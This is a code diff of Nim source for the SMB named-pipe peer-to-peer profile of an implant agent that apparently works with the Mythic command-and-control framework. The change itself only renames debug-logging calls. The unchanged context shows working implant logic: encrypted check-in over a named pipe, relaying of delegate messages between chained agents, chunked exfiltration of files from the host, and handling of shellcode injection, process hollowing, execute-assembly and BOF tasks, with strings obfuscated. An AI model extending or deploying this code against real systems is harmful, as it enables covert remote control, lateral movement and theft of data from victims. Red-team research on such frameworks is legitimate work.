@@ -122,7 +122,7 @@ proc newSmbProfile*(): SmbProfile =
   result.listening = false
   result.callbackUuid = result.config.uuid  # Initialize with payload UUID
   
-  debug "[DEBUG] SMB P2P Profile: Created (will listen on pipe: ", result.pipeName, ")"
+  debugLog "smb", "SMB P2P Profile: Created (will listen on pipe: ", result.pipeName, ")"
 
 proc sendChunkedMessage(pipeHandle: HANDLE, message: string): bool =
   ## Send a chunked message (12-byte header + data per chunk)
@@ -131,7 +131,7 @@ proc sendChunkedMessage(pipeHandle: HANDLE, message: string): bool =
   let messageLen = message.len
   let totalChunks = (messageLen + CHUNK_SIZE - 1) div CHUNK_SIZE
   
-  debug "[DEBUG] SMB P2P: Sending message in ", totalChunks, " chunks (", messageLen, " bytes total)"
+  debugLog "smb", "SMB P2P: Sending message in ", totalChunks, " chunks (", messageLen, " bytes total)"
   
   for chunkIndex in 0..<totalChunks:
     let startPos = chunkIndex * CHUNK_SIZE
@@ -163,26 +163,26 @@ proc sendChunkedMessage(pipeHandle: HANDLE, message: string): bool =
     headerBytes[10] = byte((chunkIndexU32 shr 8) and 0xFF)
     headerBytes[11] = byte(chunkIndexU32 and 0xFF)
     
-    debug "[DEBUG] SMB P2P: Sending chunk ", chunkIndex + 1, "/", totalChunks, " (", chunkDataLen, " bytes)"
+    debugLog "smb", "SMB P2P: Sending chunk ", chunkIndex + 1, "/", totalChunks, " (", chunkDataLen, " bytes)"
     
     # Write header
     var bytesWritten: DWORD = 0
     if WriteFile(pipeHandle, addr headerBytes[0], 12, addr bytesWritten, nil) == 0:
-      debug "[DEBUG] SMB P2P: Failed to write chunk header, error: ", GetLastError()
+      debugLog "smb", "SMB P2P: Failed to write chunk header, error: ", GetLastError()
       return false
     
     # Write chunk data
     if chunkDataLen > 0:
       bytesWritten = 0
       if WriteFile(pipeHandle, unsafeAddr chunkData[0], chunkDataLen.DWORD, addr bytesWritten, nil) == 0:
-        debug "[DEBUG] SMB P2P: Failed to write chunk data, error: ", GetLastError()
+        debugLog "smb", "SMB P2P: Failed to write chunk data, error: ", GetLastError()
         return false
   
   # Note: FlushFileBuffers intentionally NOT called here.
   # On named pipes, FlushFileBuffers blocks until the remote end reads ALL data,
   # which deadlocks the single-threaded SMB child on large messages (50+ chunks).
   # WriteFile on a synchronous pipe already writes to the kernel buffer.
-  debug "[DEBUG] SMB P2P: Message sent successfully"
+  debugLog "smb", "SMB P2P: Message sent successfully"
   return true
 
 proc receiveChunkedMessage(pipeHandle: HANDLE): string =
@@ -196,17 +196,17 @@ proc receiveChunkedMessage(pipeHandle: HANDLE): string =
     var headerBytes: array[12, byte]
     var bytesRead: DWORD = 0
     
-    debug "[DEBUG] SMB P2P: About to call ReadFile for header (pipeHandle=", pipeHandle, ")"
+    debugLog "smb", "SMB P2P: About to call ReadFile for header (pipeHandle=", pipeHandle, ")"
     let readResult = ReadFile(pipeHandle, addr headerBytes[0], 12, addr bytesRead, nil)
     let lastErr = GetLastError()
-    debug "[DEBUG] SMB P2P: ReadFile returned ", readResult, ", bytesRead=", bytesRead, ", lastError=", lastErr
+    debugLog "smb", "SMB P2P: ReadFile returned ", readResult, ", bytesRead=", bytesRead, ", lastError=", lastErr
     
     if readResult == 0:
-      debug "[DEBUG] SMB P2P: Failed to read chunk header, error: ", lastErr
+      debugLog "smb", "SMB P2P: Failed to read chunk header, error: ", lastErr
       return ""
     
     if bytesRead != 12:
-      debug "[DEBUG] SMB P2P: Incomplete chunk header read: ", bytesRead, " bytes"
+      debugLog "smb", "SMB P2P: Incomplete chunk header read: ", bytesRead, " bytes"
       return ""
     
     # Parse header (big-endian)
@@ -226,13 +226,13 @@ proc receiveChunkedMessage(pipeHandle: HANDLE): string =
                      headerBytes[11].uint32
     
     if chunkIndex >= totalChunks:
-      debug "[DEBUG] SMB P2P: Invalid chunk index: ", chunkIndex
+      debugLog "smb", "SMB P2P: Invalid chunk index: ", chunkIndex
       return ""
     
     # Read chunk data
     let chunkDataLen = (chunkLength - 12).int
     if chunkDataLen < 0 or chunkDataLen > 100_000_000:
-      debug "[DEBUG] SMB P2P: Invalid chunk data length: ", chunkDataLen
+      debugLog "smb", "SMB P2P: Invalid chunk data length: ", chunkDataLen
       return ""
     
     var chunkData = newString(chunkDataLen)
@@ -240,40 +240,40 @@ proc receiveChunkedMessage(pipeHandle: HANDLE): string =
     
     if chunkDataLen > 0:
       if ReadFile(pipeHandle, addr chunkData[0], chunkDataLen.DWORD, addr bytesRead, nil) == 0:
-        debug "[DEBUG] SMB P2P: Failed to read chunk data, error: ", GetLastError()
+        debugLog "smb", "SMB P2P: Failed to read chunk data, error: ", GetLastError()
         return ""
       
       if bytesRead.int != chunkDataLen:
-        debug "[DEBUG] SMB P2P: Incomplete chunk data read: ", bytesRead, " bytes"
+        debugLog "smb", "SMB P2P: Incomplete chunk data read: ", bytesRead, " bytes"
         return ""
     
     messageBuffer.add(chunkData)
     receivedChunks += 1
     
-    debug "[DEBUG] SMB P2P: Received chunk ", receivedChunks, "/", totalChunks
+    debugLog "smb", "SMB P2P: Received chunk ", receivedChunks, "/", totalChunks
     
     if receivedChunks == totalChunks:
       break
   
-  debug "[DEBUG] SMB P2P: Received complete message (", messageBuffer.len, " bytes)"
+  debugLog "smb", "SMB P2P: Received complete message (", messageBuffer.len, " bytes)"
   return messageBuffer
 
 proc encryptMessage(profile: SmbProfile, message: string, uuid: string): string =
   ## Encrypt a message with AES or just base64 encode if no key
   if profile.aesKey.len > 0 and uuid.len > 0:
-    debug "[DEBUG] SMB P2P: Encrypting message with AES-256-CBC+HMAC"
+    debugLog "smb", "SMB P2P: Encrypting message with AES-256-CBC+HMAC"
     result = encryptPayload(message, profile.aesKey, uuid)
   else:
-    debug "[DEBUG] SMB P2P: Encoding message (no encryption)"
+    debugLog "smb", "SMB P2P: Encoding message (no encryption)"
     result = encode(uuid & message)
 
 proc decryptMessage(profile: SmbProfile, message: string): string =
   ## Decrypt a message with AES or just base64 decode if no key
   if profile.aesKey.len > 0:
-    debug "[DEBUG] SMB P2P: Decrypting message with AES-256-CBC+HMAC"
+    debugLog "smb", "SMB P2P: Decrypting message with AES-256-CBC+HMAC"
     result = decryptPayload(message, profile.aesKey)
   else:
-    debug "[DEBUG] SMB P2P: Decoding message (no encryption)"
+    debugLog "smb", "SMB P2P: Decoding message (no encryption)"
     let decoded = decode(message)
     if decoded.len > 36:
       result = decoded[36..^1]
@@ -330,7 +330,7 @@ proc forwardIncomingDelegatesSmb*(msgJson: JsonNode) =
       if delegate.hasKey(obf("uuid")) and delegate.hasKey(obf("message")):
         let delegateUuid = delegate[obf("uuid")].getStr()
         let delegateMsg = delegate[obf("message")].getStr()
-        debug "[DEBUG] SMB P2P: Forwarding delegate to downstream agent ", delegateUuid
+        debugLog "smb", "SMB P2P: Forwarding delegate to downstream agent ", delegateUuid
         discard forwardDelegateToConnect(delegateUuid, delegateMsg)
         discard forwardDelegateToLink(delegateUuid, delegateMsg)
         # Handle rekeying if Mythic assigned a new UUID
@@ -340,7 +340,7 @@ proc forwardIncomingDelegatesSmb*(msgJson: JsonNode) =
           else:
             delegate[obf("mythic_uuid")].getStr()
           if newUuid != delegateUuid:
-            debug "[DEBUG] SMB P2P: Rekeying downstream from ", delegateUuid, " to ", newUuid
+            debugLog "smb", "SMB P2P: Rekeying downstream from ", delegateUuid, " to ", newUuid
             discard rekeyConnectConnection(delegateUuid, newUuid)
             discard rekeyLinkConnection(delegateUuid, newUuid)
 
@@ -379,14 +379,14 @@ proc collectDownstreamDelegatesSmb*(callbackUuid: string): tuple[delegates: Json
 proc startListening*(profile: SmbProfile): bool =
   ## Start listening on the named pipe
   if profile.listening:
-    debug "[DEBUG] SMB P2P: Already listening"
+    debugLog "smb", "SMB P2P: Already listening"
     return true
   
   try:
     let pipePath = r"\\.\pipe\" & profile.pipeName
     let wPipePath = newWideCString(pipePath)
     
-    debug "[DEBUG] SMB P2P: Creating named pipe: ", pipePath
+    debugLog "smb", "SMB P2P: Creating named pipe: ", pipePath
     
     profile.pipeHandle = CreateNamedPipeW(
       wPipePath,
@@ -400,55 +400,55 @@ proc startListening*(profile: SmbProfile): bool =
     )
     
     if profile.pipeHandle == INVALID_HANDLE_VALUE:
-      debug "[DEBUG] SMB P2P: Failed to create named pipe, error: ", GetLastError()
+      debugLog "smb", "SMB P2P: Failed to create named pipe, error: ", GetLastError()
       return false
     
     profile.listening = true
-    debug "[DEBUG] SMB P2P: Named pipe created successfully"
+    debugLog "smb", "SMB P2P: Named pipe created successfully"
     return true
     
   except Exception as e:
-    debug "[DEBUG] SMB P2P: Exception creating pipe: ", e.msg
+    debugLog "smb", "SMB P2P: Exception creating pipe: ", e.msg
     return false
 
 proc send*(profile: SmbProfile, data: string, callbackUuid: string = ""): string =
   ## For SMB P2P, send is not used directly - communication happens through handleClient
   ## This is here for interface compatibility with other profiles
-  debug "[DEBUG] SMB P2P: send() called but SMB is a listener profile (P2P)"
+  debugLog "smb", "SMB P2P: send() called but SMB is a listener profile (P2P)"
   result = ""
 
 proc start*(profile: SmbProfile) =
   ## Start the SMB P2P listener and handle clients
-  debug "[DEBUG] SMB P2P: Starting SMB listener agent on pipe: ", profile.pipeName
+  debugLog "smb", "SMB P2P: Starting SMB listener agent on pipe: ", profile.pipeName
   
   # Start listening
   if not profile.startListening():
-    debug "[DEBUG] SMB P2P: Failed to start listening, exiting"
+    debugLog "smb", "SMB P2P: Failed to start listening, exiting"
     return
   
-  debug "[DEBUG] SMB P2P: Server started, waiting for connections"
+  debugLog "smb", "SMB P2P: Server started, waiting for connections"
   
   # Main accept loop - runs until process exits
   while true:
     try:
       # Wait for client to connect
-      debug "[DEBUG] SMB P2P: Waiting for client connection..."
+      debugLog "smb", "SMB P2P: Waiting for client connection..."
       
       let connectResult = ConnectNamedPipe(profile.pipeHandle, nil)
       let lastError = GetLastError()
       
       # Check if connection succeeded
       if connectResult == 0 and lastError != ERROR_PIPE_CONNECTED.DWORD:
-        debug "[DEBUG] SMB P2P: ConnectNamedPipe failed, error: ", lastError
+        debugLog "smb", "SMB P2P: ConnectNamedPipe failed, error: ", lastError
         # Close and recreate pipe for next connection
         discard CloseHandle(profile.pipeHandle)
         profile.listening = false
         if not profile.startListening():
-          debug "[DEBUG] SMB P2P: Failed to recreate pipe"
+          debugLog "smb", "SMB P2P: Failed to recreate pipe"
           return
         continue
       
-      debug "[DEBUG] SMB P2P: Client connected"
+      debugLog "smb", "SMB P2P: Client connected"
       
       # Give client time to set up reader and writer threads
       # The linking agent now uses proper synchronization and waits
@@ -456,12 +456,12 @@ proc start*(profile: SmbProfile) =
       sleep(200)
       
       # Send checkin to link agent
-      debug "[DEBUG] SMB P2P: Sending checkin to link agent"
+      debugLog "smb", "SMB P2P: Sending checkin to link agent"
       let checkinMsg = buildCheckinInfo()
       let checkinData = profile.encryptMessage($checkinMsg, profile.callbackUuid)
       
       if not sendChunkedMessage(profile.pipeHandle, checkinData):
-        debug "[DEBUG] SMB P2P: Failed to send checkin"
+        debugLog "smb", "SMB P2P: Failed to send checkin"
         discard DisconnectNamedPipe(profile.pipeHandle)
         discard CloseHandle(profile.pipeHandle)
         profile.listening = false
@@ -469,16 +469,16 @@ proc start*(profile: SmbProfile) =
           return
         continue
       
-      debug "[DEBUG] SMB P2P: Waiting for checkin response from Mythic (via link agent)"
-      debug "[DEBUG] SMB P2P: pipeHandle=", profile.pipeHandle, ", about to call receiveChunkedMessage"
+      debugLog "smb", "SMB P2P: Waiting for checkin response from Mythic (via link agent)"
+      debugLog "smb", "SMB P2P: pipeHandle=", profile.pipeHandle, ", about to call receiveChunkedMessage"
       
       # Wait for checkin response
       let checkinResp = receiveChunkedMessage(profile.pipeHandle)
-      debug "[DEBUG] SMB P2P: receiveChunkedMessage returned, len=", checkinResp.len
+      debugLog "smb", "SMB P2P: receiveChunkedMessage returned, len=", checkinResp.len
       
       if checkinResp.len == 0:
         let lastErr = GetLastError()
-        debug "[DEBUG] SMB P2P: No checkin response (error: ", lastErr, "), closing client"
+        debugLog "smb", "SMB P2P: No checkin response (error: ", lastErr, "), closing client"
         discard DisconnectNamedPipe(profile.pipeHandle)
         discard CloseHandle(profile.pipeHandle)
         profile.listening = false
@@ -487,19 +487,19 @@ proc start*(profile: SmbProfile) =
         continue
       
       let checkinRespData = profile.decryptMessage(checkinResp)
-      debug "[DEBUG] SMB P2P: Received checkin response from Mythic"
+      debugLog "smb", "SMB P2P: Received checkin response from Mythic"
       
       # Parse checkin response to get callback UUID
       try:
         let checkinJson = parseJson(checkinRespData)
         if checkinJson.hasKey(obf("id")):
           profile.callbackUuid = checkinJson[obf("id")].getStr()
-          debug "[DEBUG] SMB P2P: Callback UUID updated to: ", profile.callbackUuid
+          debugLog "smb", "SMB P2P: Callback UUID updated to: ", profile.callbackUuid
       except Exception as e:
-        debug "[DEBUG] SMB P2P: Failed to parse checkin response: ", e.msg
+        debugLog "smb", "SMB P2P: Failed to parse checkin response: ", e.msg
       
       # Enter client message loop
-      debug "[DEBUG] SMB P2P: Entering client message loop"
+      debugLog "smb", "SMB P2P: Entering client message loop"
       
       var backgroundTasks = initTable[string, BackgroundTaskState]()
       var clientShouldExit = false
@@ -510,7 +510,7 @@ proc start*(profile: SmbProfile) =
           var bytesAvail: DWORD = 0
           if PeekNamedPipe(profile.pipeHandle, nil, 0, nil, addr bytesAvail, nil) == 0:
             let err = GetLastError()
-            debug "[DEBUG] SMB P2P: PeekNamedPipe failed, error: ", err, ", client disconnected"
+            debugLog "smb", "SMB P2P: PeekNamedPipe failed, error: ", err, ", client disconnected"
             break
           
           if bytesAvail == 0:
@@ -520,7 +520,7 @@ proc start*(profile: SmbProfile) =
             # we only drain them when processing a message from the parent
             let (idleDelegates, idleEdges) = collectDownstreamDelegatesSmb(profile.callbackUuid)
             if idleDelegates.len > 0 or idleEdges.len > 0:
-              debug "[DEBUG] SMB P2P: Proactively sending downstream data during idle (", idleDelegates.len, " delegates, ", idleEdges.len, " edges)"
+              debugLog "smb", "SMB P2P: Proactively sending downstream data during idle (", idleDelegates.len, " delegates, ", idleEdges.len, " edges)"
               let delegateResponse = %* {
                 obf("action"): obf("post_response"),
                 obf("responses"): []
@@ -539,40 +539,40 @@ proc start*(profile: SmbProfile) =
             continue
           
           # Data available, read it
-          debug "[DEBUG] SMB P2P: ", bytesAvail, " bytes available, reading message"
+          debugLog "smb", "SMB P2P: ", bytesAvail, " bytes available, reading message"
           let clientMsg = receiveChunkedMessage(profile.pipeHandle)
           if clientMsg.len == 0:
-            debug "[DEBUG] SMB P2P: Client disconnected"
+            debugLog "smb", "SMB P2P: Client disconnected"
             break
           
-          debug "[DEBUG] SMB P2P: Received ", clientMsg.len, " bytes from linking agent"
+          debugLog "smb", "SMB P2P: Received ", clientMsg.len, " bytes from linking agent"
           let decrypted = profile.decryptMessage(clientMsg)
-          debug "[DEBUG] SMB P2P: Decrypted message (", decrypted.len, " bytes)"
+          debugLog "smb", "SMB P2P: Decrypted message (", decrypted.len, " bytes)"
           
           # Check for special actions
           try:
             let msgJson = parseJson(decrypted)
-            debug "[DEBUG] SMB P2P: Parsed JSON, checking for action or responses..."
+            debugLog "smb", "SMB P2P: Parsed JSON, checking for action or responses..."
             
             # Forward any incoming delegates to downstream P2P agents (multi-level P2P support)
             forwardIncomingDelegatesSmb(msgJson)
             
             # Check for responses array (post_response from Mythic)
             if msgJson.hasKey(obf("responses")):
-              debug "[DEBUG] SMB P2P: Received post_response with responses array from Mythic"
+              debugLog "smb", "SMB P2P: Received post_response with responses array from Mythic"
               
               let responses = msgJson[obf("responses")]
               var chunksToSend = newJArray()
               
               for resp in responses:
                 if not resp.hasKey(obf("task_id")):
-                  debug "[DEBUG] SMB P2P: Skipping response without task_id"
+                  debugLog "smb", "SMB P2P: Skipping response without task_id"
                   continue
                 let taskId = resp[obf("task_id")].getStr()
                 
                 # Handle chunk_data (Mythic sending file chunks for upload-type tasks)
                 if resp.hasKey(obf("chunk_data")):
-                  debug "[DEBUG] SMB P2P: Received chunk_data from Mythic for task ", taskId
+                  debugLog "smb", "SMB P2P: Received chunk_data from Mythic for task ", taskId
                   
                   if backgroundTasks.hasKey(taskId):
                     var state = backgroundTasks[taskId]
@@ -589,7 +589,7 @@ proc start*(profile: SmbProfile) =
                       
                       if uploadResp.hasKey(obf("completed")) and uploadResp[obf("completed")].getBool():
                         backgroundTasks.del(taskId)
-                        debug "[DEBUG] SMB P2P: Upload complete"
+                        debugLog "smb", "SMB P2P: Upload complete"
                       else:
                         state.currentChunk += 1
                         backgroundTasks[taskId] = state
@@ -603,7 +603,7 @@ proc start*(profile: SmbProfile) =
                       
                       if execResp.hasKey(obf("completed")) and execResp[obf("completed")].getBool():
                         backgroundTasks.del(taskId)
-                        debug "[DEBUG] SMB P2P: Execute-assembly complete"
+                        debugLog "smb", "SMB P2P: Execute-assembly complete"
                       else:
                         state.currentChunk += 1
                         backgroundTasks[taskId] = state
@@ -617,7 +617,7 @@ proc start*(profile: SmbProfile) =
                       
                       if bofResp.hasKey(obf("completed")) and bofResp[obf("completed")].getBool():
                         backgroundTasks.del(taskId)
-                        debug "[DEBUG] SMB P2P: Inline_execute complete"
+                        debugLog "smb", "SMB P2P: Inline_execute complete"
                       else:
                         state.currentChunk += 1
                         backgroundTasks[taskId] = state
@@ -631,7 +631,7 @@ proc start*(profile: SmbProfile) =
                       
                       if injectResp.hasKey(obf("completed")) and injectResp[obf("completed")].getBool():
                         backgroundTasks.del(taskId)
-                        debug "[DEBUG] SMB P2P: Shinject complete"
+                        debugLog "smb", "SMB P2P: Shinject complete"
                       else:
                         state.currentChunk += 1
                         backgroundTasks[taskId] = state
@@ -645,7 +645,7 @@ proc start*(profile: SmbProfile) =
                       
                       if donutResp.hasKey(obf("completed")) and donutResp[obf("completed")].getBool():
                         backgroundTasks.del(taskId)
-                        debug "[DEBUG] SMB P2P: Donut complete"
+                        debugLog "smb", "SMB P2P: Donut complete"
                       else:
                         state.currentChunk += 1
                         backgroundTasks[taskId] = state
@@ -659,13 +659,13 @@ proc start*(profile: SmbProfile) =
                       
                       if hollowResp.hasKey(obf("completed")) and hollowResp[obf("completed")].getBool():
                         backgroundTasks.del(taskId)
-                        debug "[DEBUG] SMB P2P: Inject hollow complete"
+                        debugLog "smb", "SMB P2P: Inject hollow complete"
                       else:
                         state.currentChunk += 1
                         backgroundTasks[taskId] = state
                     
                     of btDownload:
-                      debug "[DEBUG] SMB P2P: ERROR - received chunk_data for download task!"
+                      debugLog "smb", "SMB P2P: ERROR - received chunk_data for download task!"
                   
                   continue
                 
@@ -675,13 +675,13 @@ proc start*(profile: SmbProfile) =
                   
                   if resp.hasKey(obf("chunk_num")):
                     let chunkNum = resp[obf("chunk_num")].getInt()
-                    debug "[DEBUG] SMB P2P: Mythic acknowledged chunk ", chunkNum, " for task ", taskId
+                    debugLog "smb", "SMB P2P: Mythic acknowledged chunk ", chunkNum, " for task ", taskId
                     
                     if backgroundTasks.hasKey(taskId):
                       var state = backgroundTasks[taskId]
                       if state.taskType == btDownload:
                         if state.currentChunk < state.totalChunks:
-                          debug "[DEBUG] SMB P2P: Sending chunk ", state.currentChunk + 1, "/", state.totalChunks
+                          debugLog "smb", "SMB P2P: Sending chunk ", state.currentChunk + 1, "/", state.totalChunks
                           let chunkResp = sendDownloadChunk(taskId, fileId, state.path, state.fileData, state.currentChunk, state.totalChunks)
                           
                           if chunkResp.hasKey(obf("completed")) and chunkResp[obf("completed")].getBool():
@@ -697,13 +697,13 @@ proc start*(profile: SmbProfile) =
                             state.currentChunk += 1
                             backgroundTasks[taskId] = state
                         else:
-                          debug "[DEBUG] SMB P2P: All chunks sent, sending final completion message"
+                          debugLog "smb", "SMB P2P: All chunks sent, sending final completion message"
                           let completeMsg = completeDownload(taskId, fileId, state.path)
                           chunksToSend.add(completeMsg)
                           backgroundTasks.del(taskId)
                   else:
                     # Initial file_id assignment
-                    debug "[DEBUG] SMB P2P: Mythic assigned file_id ", fileId, " to task ", taskId
+                    debugLog "smb", "SMB P2P: Mythic assigned file_id ", fileId, " to task ", taskId
                     
                     if backgroundTasks.hasKey(taskId):
                       var state = backgroundTasks[taskId]
@@ -711,7 +711,7 @@ proc start*(profile: SmbProfile) =
                         state.fileId = fileId
                         backgroundTasks[taskId] = state
                         
-                        debug "[DEBUG] SMB P2P: Starting chunk uploads for download task"
+                        debugLog "smb", "SMB P2P: Starting chunk uploads for download task"
                         let chunkResp = sendDownloadChunk(taskId, fileId, state.path, state.fileData, state.currentChunk, state.totalChunks)
                         
                         if chunkResp.hasKey(obf("completed")) and chunkResp[obf("completed")].getBool():
@@ -738,12 +738,12 @@ proc start*(profile: SmbProfile) =
                 }
                 if downDelegates.len > 0:
                   chunkResponse[obf("delegates")] = downDelegates
-                  debug "[DEBUG] SMB P2P: Including ", downDelegates.len, " downstream delegate(s) with chunk response"
+                  debugLog "smb", "SMB P2P: Including ", downDelegates.len, " downstream delegate(s) with chunk response"
                 if downEdges.len > 0:
                   chunkResponse[obf("edges")] = downEdges
-                  debug "[DEBUG] SMB P2P: Including ", downEdges.len, " downstream edge(s) with chunk response"
+                  debugLog "smb", "SMB P2P: Including ", downEdges.len, " downstream edge(s) with chunk response"
                 
-                debug "[DEBUG] SMB P2P: Sending ", chunksToSend.len, " download chunk(s)"
+                debugLog "smb", "SMB P2P: Sending ", chunksToSend.len, " download chunk(s)"
                 let responseEncrypted = profile.encryptMessage($chunkResponse, profile.callbackUuid)
                 discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
                 continue
@@ -757,10 +757,10 @@ proc start*(profile: SmbProfile) =
                 }
                 if noChunkDelegates.len > 0:
                   delegateResponse[obf("delegates")] = noChunkDelegates
-                  debug "[DEBUG] SMB P2P: Sending ", noChunkDelegates.len, " downstream delegate(s) (no chunks)"
+                  debugLog "smb", "SMB P2P: Sending ", noChunkDelegates.len, " downstream delegate(s) (no chunks)"
                 if noChunkEdges.len > 0:
                   delegateResponse[obf("edges")] = noChunkEdges
-                  debug "[DEBUG] SMB P2P: Sending ", noChunkEdges.len, " downstream edge(s) (no chunks)"
+                  debugLog "smb", "SMB P2P: Sending ", noChunkEdges.len, " downstream edge(s) (no chunks)"
                 let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
                 discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
               # else: Do NOT send a response for empty post_response with no downstream data.
@@ -771,22 +771,22 @@ proc start*(profile: SmbProfile) =
             # Check for action field
             elif msgJson.hasKey(obf("action")):
               let action = msgJson[obf("action")].getStr()
-              debug "[DEBUG] SMB P2P: Received action: ", action
+              debugLog "smb", "SMB P2P: Received action: ", action
               
               if action == obf("checkin"):
-                debug "[DEBUG] SMB P2P: Processing checkin response"
+                debugLog "smb", "SMB P2P: Processing checkin response"
                 if msgJson.hasKey(obf("status")) and msgJson[obf("status")].getStr() == "success":
                   if msgJson.hasKey(obf("id")):
                     profile.callbackUuid = msgJson[obf("id")].getStr()
-                    debug "[DEBUG] SMB P2P: Updated callback UUID to: ", profile.callbackUuid
+                    debugLog "smb", "SMB P2P: Updated callback UUID to: ", profile.callbackUuid
                 continue
                 
               elif action == obf("get_tasking"):
-                debug "[DEBUG] SMB P2P: Received get_tasking response with tasks"
+                debugLog "smb", "SMB P2P: Received get_tasking response with tasks"
                 
                 if msgJson.hasKey(obf("tasks")) and msgJson[obf("tasks")].len > 0:
                   let tasks = msgJson[obf("tasks")]
-                  debug "[DEBUG] SMB P2P: Received ", tasks.len, " task(s) to execute"
+                  debugLog "smb", "SMB P2P: Received ", tasks.len, " task(s) to execute"
                   
                   var taskResponses = newJArray()
                   var shouldExit = false
@@ -797,7 +797,7 @@ proc start*(profile: SmbProfile) =
                       
                       # Handle background_task
                       if command == obf("background_task"):
-                        debug "[DEBUG] SMB P2P: Processing background_task for ", taskId
+                        debugLog "smb", "SMB P2P: Processing background_task for ", taskId
                         
                         # Parse parameters
                         var bgParams = newJObject()
@@ -807,7 +807,7 @@ proc start*(profile: SmbProfile) =
                             try:
                               bgParams = parseJson(paramStr)
                             except:
-                              debug "[DEBUG] Failed to parse background_task parameters"
+                              debugLog "smb", "Failed to parse background_task parameters"
                         
                         if backgroundTasks.hasKey(taskId):
                           var state = backgroundTasks[taskId]
@@ -819,15 +819,15 @@ proc start*(profile: SmbProfile) =
                             
                             if chunkResponse.hasKey(obf("completed")) and chunkResponse[obf("completed")].getBool():
                               backgroundTasks.del(taskId)
-                              debug "[DEBUG] SMB P2P: Download complete"
+                              debugLog "smb", "SMB P2P: Download complete"
                             else:
                               state.currentChunk += 1
                               backgroundTasks[taskId] = state
                           
                           of btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow:
-                            debug "[DEBUG] SMB P2P: background_task not applicable for upload-type tasks"
+                            debugLog "smb", "SMB P2P: background_task not applicable for upload-type tasks"
                         else:
-                          debug "[DEBUG] SMB P2P: No background task state for ", taskId
+                          debugLog "smb", "SMB P2P: No background task state for ", taskId
                         
                         continue
                       
@@ -839,20 +839,20 @@ proc start*(profile: SmbProfile) =
                           try:
                             params = parseJson(paramStr)
                           except:
-                            debug "[DEBUG] Failed to parse parameters: " & paramStr
+                            debugLog "smb", "Failed to parse parameters: " & paramStr
                       
                       # Execute task
                       let execResult = executeTask(taskId, command, params)
                       
                       if execResult.shouldExit:
-                        debug "[DEBUG] SMB P2P: Exit command received"
+                        debugLog "smb", "SMB P2P: Exit command received"
                         taskResponses.add(execResult.response)
                         shouldExit = true
                         break
                       
                       # Handle download
                       if command == obf("download") and execResult.needsBackgroundTracking:
-                        debug "[DEBUG] SMB P2P: Starting download"
+                        debugLog "smb", "SMB P2P: Starting download"
                         taskResponses.add(execResult.response)
                         
                         var state = BackgroundTaskState(
@@ -875,15 +875,15 @@ proc start*(profile: SmbProfile) =
                             discard f.readBytes(state.fileData, 0, fileSize)
                             f.close()
                             backgroundTasks[taskId] = state
-                            debug "[DEBUG] SMB P2P: File loaded, ", fileSize, " bytes"
+                            debugLog "smb", "SMB P2P: File loaded, ", fileSize, " bytes"
                         except Exception as e:
-                          debug "[DEBUG] SMB P2P: Failed to read file: ", e.msg
+                          debugLog "smb", "SMB P2P: Failed to read file: ", e.msg
                         
                         continue
                       
                       # Handle upload
                       elif command == obf("upload") and execResult.needsBackgroundTracking:
-                        debug "[DEBUG] SMB P2P: Starting upload"
+                        debugLog "smb", "SMB P2P: Starting upload"
                         taskResponses.add(execResult.response)
                         
                         let uploadPath = if execResult.response.hasKey(obf("upload")):
@@ -911,7 +911,7 @@ proc start*(profile: SmbProfile) =
                         command == obf("donut") or 
                         command == obf("inject_hollow")):
                         
-                        debug "[DEBUG] SMB P2P: Starting file-receiving task: ", command
+                        debugLog "smb", "SMB P2P: Starting file-receiving task: ", command
                         taskResponses.add(execResult.response)
                         
                         let taskType = case command
@@ -947,23 +947,23 @@ proc start*(profile: SmbProfile) =
                   }
                   if taskDelegates.len > 0:
                     taskingResponse[obf("delegates")] = taskDelegates
-                    debug "[DEBUG] SMB P2P: Including ", taskDelegates.len, " downstream delegate(s) with task response"
+                    debugLog "smb", "SMB P2P: Including ", taskDelegates.len, " downstream delegate(s) with task response"
                   if taskEdges.len > 0:
                     taskingResponse[obf("edges")] = taskEdges
-                    debug "[DEBUG] SMB P2P: Including ", taskEdges.len, " downstream edge(s) with task response"
+                    debugLog "smb", "SMB P2P: Including ", taskEdges.len, " downstream edge(s) with task response"
                   
-                  debug "[DEBUG] SMB P2P: Sending ", taskResponses.len, " task response(s)"
+                  debugLog "smb", "SMB P2P: Sending ", taskResponses.len, " task response(s)"
                   let responseEncrypted = profile.encryptMessage($taskingResponse, profile.callbackUuid)
                   discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
                   
                   # If exit was requested, wait and break (parent will detect EOF and send edge removal)
                   if shouldExit:
-                    debug "[DEBUG] SMB P2P: Exit command sent, waiting for delivery before shutdown"
+                    debugLog "smb", "SMB P2P: Exit command sent, waiting for delivery before shutdown"
                     sleep(500)
                     clientShouldExit = true
                     break
                 else:
-                  debug "[DEBUG] SMB P2P: No tasks in get_tasking response"
+                  debugLog "smb", "SMB P2P: No tasks in get_tasking response"
                   # Check for downstream delegate data to relay
                   let (noTaskDelegates, noTaskEdges) = collectDownstreamDelegatesSmb(profile.callbackUuid)
                   if noTaskDelegates.len > 0 or noTaskEdges.len > 0:
@@ -973,10 +973,10 @@ proc start*(profile: SmbProfile) =
                     }
                     if noTaskDelegates.len > 0:
                       delegateResponse[obf("delegates")] = noTaskDelegates
-                      debug "[DEBUG] SMB P2P: Sending ", noTaskDelegates.len, " downstream delegate(s) (no tasks)"
+                      debugLog "smb", "SMB P2P: Sending ", noTaskDelegates.len, " downstream delegate(s) (no tasks)"
                     if noTaskEdges.len > 0:
                       delegateResponse[obf("edges")] = noTaskEdges
-                      debug "[DEBUG] SMB P2P: Sending ", noTaskEdges.len, " downstream edge(s) (no tasks)"
+                      debugLog "smb", "SMB P2P: Sending ", noTaskEdges.len, " downstream edge(s) (no tasks)"
                     let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
                     discard sendChunkedMessage(profile.pipeHandle, responseEncrypted)
                   # else: Do NOT send a response for empty get_tasking.
@@ -984,29 +984,29 @@ proc start*(profile: SmbProfile) =
                   # The egress agent pushes data down and forwards responses back.
                   continue
           except Exception as e:
-            debug "[DEBUG] SMB P2P: Error processing message: ", e.msg
+            debugLog "smb", "SMB P2P: Error processing message: ", e.msg
           
         except Exception as e:
-          debug "[DEBUG] SMB P2P: Error in client loop: ", e.msg
+          debugLog "smb", "SMB P2P: Error in client loop: ", e.msg
           break
       
       # Disconnect client
